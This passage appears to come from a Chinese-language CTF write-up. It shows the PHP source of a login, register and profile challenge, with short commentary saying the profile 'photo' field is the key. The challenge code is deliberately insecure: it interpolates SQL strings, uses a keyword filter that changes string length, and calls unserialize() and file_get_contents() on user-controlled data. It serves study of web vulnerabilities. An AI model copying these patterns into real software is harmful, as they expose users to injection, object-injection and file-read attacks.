class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		<span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>, <span class="variable">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$config</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>粗略的一看这应该就是一个类的汇总文件，里面连接了mysql数据库</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">is_exists</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">			<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">register</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Register</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">REGISTER</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<p>是一个注册界面，先包含class.php文件，再输入用户名密码，写入数据库，结合class.php里的register方法可以看出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
<p>这应该就是填写完信息之后进入的用户界面了，对应class.php中的show_profile方法！这里的photo变量是本题的重点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Login</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">LOGIN</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 